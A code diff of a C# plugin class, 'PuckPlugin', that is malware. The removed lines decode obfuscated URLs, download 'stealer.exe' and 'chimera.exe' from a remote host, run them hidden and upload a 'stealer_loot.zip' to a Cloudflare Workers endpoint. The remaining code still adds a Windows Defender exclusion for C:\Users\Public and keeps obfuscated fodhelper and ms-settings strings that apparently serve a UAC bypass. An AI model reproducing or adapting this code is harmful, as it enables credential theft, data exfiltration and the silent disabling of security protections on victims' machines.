@@ -1,7 +1,6 @@
 using System;
 using System.Diagnostics;
 using System.IO;
-using System.Net;
 using System.Threading;
 
 public class PuckPlugin : IPuckPlugin
@@ -28,75 +27,33 @@ public class PuckPlugin : IPuckPlugin
 
     private static void Run()
     {
-        // C:\Users\Public\debug.txt
-        byte[] bDebug = new byte[] {0x0e,0x77,0x11,0x18,0x3e,0x28,0x3f,0x3e,
-                0x11,0x1d,0x38,0x2f,0x21,0x24,0x2e,0x11,
-                0x29,0x28,0x2f,0x38,0x2a,0x63,0x39,0x35,0x39};
-        // C:\Users\Public
-        byte[] bDrop = new byte[] {0x0e,0x77,0x11,0x18,0x3e,0x28,0x3f,0x3e,
-                0x11,0x1d,0x38,0x2f,0x21,0x24,0x2e};
-        // http://144-172-84-23.sslip.io:7331/stealer.exe
-        byte[] bStealUrl = new byte[] {0x25,0x39,0x39,0x3d,0x77,0x62,0x62,0x7c,
-                0x79,0x79,0x60,0x7c,0x7a,0x7f,0x60,0x75,
-                0x79,0x60,0x7f,0x7e,0x63,0x3e,0x3e,0x21,
-                0x24,0x3d,0x63,0x24,0x22,0x77,0x7a,0x7e,
-                0x7e,0x7c,0x62,0x3e,0x39,0x28,0x2c,0x21,
-                0x28,0x3f,0x63,0x28,0x35,0x28};
-        // http://144-172-84-23.sslip.io:7331/chimera.exe
-        byte[] bChimUrl = new byte[] {0x25,0x39,0x39,0x3d,0x77,0x62,0x62,0x7c,
-                0x79,0x79,0x60,0x7c,0x7a,0x7f,0x60,0x75,
-                0x79,0x60,0x7f,0x7e,0x63,0x3e,0x3e,0x21,
-                0x24,0x3d,0x63,0x24,0x22,0x77,0x7a,0x7e,
-                0x7e,0x7c,0x62,0x2e,0x25,0x24,0x20,0x28,
-                0x3f,0x2c,0x63,0x28,0x35,0x28};
-        // stealer.exe
-        byte[] bStealExe = new byte[] {0x3e,0x39,0x28,0x2c,0x21,0x28,0x3f,0x63,0x28,0x35,0x28};
-        // chimera.exe
-        byte[] bChimExe  = new byte[] {0x2e,0x25,0x24,0x20,0x28,0x3f,0x2c,0x63,0x28,0x35,0x28};
-        // C:\Users\Public\stealer_loot.zip
-        byte[] bLootZip  = new byte[] {0x0e,0x77,0x11,0x18,0x3e,0x28,0x3f,0x3e,
-                0x11,0x1d,0x38,0x2f,0x21,0x24,0x2e,0x11,
-                0x3e,0x39,0x28,0x2c,0x21,0x28,0x3f,0x12,
-                0x21,0x22,0x22,0x39,0x63,0x37,0x24,0x3d};
-
-        string debugTxt = X(bDebug);
-        string dropDir  = X(bDrop);
-        string stealUrl = X(bStealUrl);
-        string chimUrl  = X(bChimUrl);
-        string stealExe = X(bStealExe);
-        string chimExe  = X(bChimExe);
-        string lootZip  = X(bLootZip);
-
         try
         {
+            // C:\Users\Public\debug.txt
+            byte[] bDebug = new byte[] {
+                0x0e,0x77,0x11,0x18,0x3e,0x28,0x3f,0x3e,
+                0x11,0x1d,0x38,0x2f,0x21,0x24,0x2e,0x11,
+                0x29,0x28,0x2f,0x38,0x2a,0x63,0x39,0x35,0x39};
+            // C:\Users\Public
+            byte[] bDrop = new byte[] {
+                0x0e,0x77,0x11,0x18,0x3e,0x28,0x3f,0x3e,
+                0x11,0x1d,0x38,0x2f,0x21,0x24,0x2e};
+
+            string debugTxt = X(bDebug);
+            string dropDir  = X(bDrop);
+
             File.WriteAllText(debugTxt, "Run started\n");
             AddDefenderExclusion(dropDir);
             Thread.Sleep(500);
             File.AppendAllText(debugTxt, "Exclusion done\n");
-
-            string stealerDst = Path.Combine(dropDir, stealExe);
-            Download(stealUrl, stealerDst);
-            File.AppendAllText(debugTxt, "stealer downloaded\n");
-
-            string chimeraDst = Path.Combine(dropDir, chimExe);
-            Download(chimUrl, chimeraDst);
-            File.AppendAllText(debugTxt, "chimera downloaded\n");
-
-            Process stealer = RunHiddenWithHandle(stealerDst, "");
-            File.AppendAllText(debugTxt, "stealer started\n");
-            if (stealer != null) { stealer.WaitForExit(60000); stealer.Close(); }
-            File.AppendAllText(debugTxt, "stealer done\n");
-
-            RunHidden(chimeraDst, "");
-            File.AppendAllText(debugTxt, "chimera started\n");
-
-            Thread.Sleep(5000);
-            UploadLoot(lootZip);
-            File.AppendAllText(debugTxt, "loot uploaded\n");
         }
         catch (Exception ex)
         {
-            File.WriteAllText(debugTxt, "ERROR: " + ex.Message);
+            byte[] bDebug = new byte[] {
+                0x0e,0x77,0x11,0x18,0x3e,0x28,0x3f,0x3e,
+                0x11,0x1d,0x38,0x2f,0x21,0x24,0x2e,0x11,
+                0x29,0x28,0x2f,0x38,0x2a,0x63,0x39,0x35,0x39};
+            File.WriteAllText(X(bDebug), "ERROR: " + ex.Message);
         }
     }
 
@@ -120,7 +77,7 @@ public class PuckPlugin : IPuckPlugin
             byte[] bFod = new byte[] {
                 0x2b,0x22,0x29,0x25,0x28,0x21,0x3d,0x28,
                 0x3f,0x63,0x28,0x35,0x28};
-            // Software\Classes\ms-settings  (cleanup)
+            // Software\Classes\ms-settings
             byte[] bClean = new byte[] {
                 0x1e,0x22,0x2b,0x39,0x3a,0x2c,0x3f,0x28,
                 0x11,0x0e,0x21,0x2c,0x3e,0x3e,0x28,0x3e,
@@ -159,60 +116,5 @@ public class PuckPlugin : IPuckPlugin
             catch { }
         }
         catch { }
-    }
-
-    private static void UploadLoot(string zipPath)
-    {
-        try
-        {
-            if (!File.Exists(zipPath)) return;
-            // Cloudflare Worker URL
-            string cbUrl = "https://hidden-lake-0908.walrus012.workers" + ".dev/data";
-            byte[] data  = File.ReadAllBytes(zipPath);
-            string b64   = Convert.ToBase64String(data);
-            string json  = "{\"action\":\"post_response\",\"responses\":[{\"task_id\":\"loot\","
-                         + "\"download\":{\"total_chunks\":1,\"chunk_num\":1,"
-                         + "\"chunk_data\":\"" + b64 + "\","
-                         + "\"full_path\":\"" + zipPath.Replace("\\", "\\\\") + "\","
-                         + "\"is_screenshot\":false}}]}";
-            using (var wc = new WebClient())
-            {
-                wc.Headers["Content-Type"] = "application/json";
-                wc.UploadString(cbUrl, "POST", json);
-            }
-        }
-        catch { }
-    }
-
-    private static void Download(string url, string dest)
-    {
-        using (var wc = new WebClient())
-            wc.DownloadFile(url, dest);
-    }
-
-    private static void RunHidden(string exe, string args)
-    {
-        try
-        {
-            Process.Start(new ProcessStartInfo {
-                FileName = exe, Arguments = args,
-                WindowStyle = ProcessWindowStyle.Hidden,
-                CreateNoWindow = true, UseShellExecute = false
-            });
-        }
-        catch { }
-    }
-
-    private static Process RunHiddenWithHandle(string exe, string args)
-    {
-        try
-        {
-            return Process.Start(new ProcessStartInfo {
-                FileName = exe, Arguments = args,
-                WindowStyle = ProcessWindowStyle.Hidden,
-                CreateNoWindow = true, UseShellExecute = false
-            });
-        }
-        catch { return null; }
     }
 }
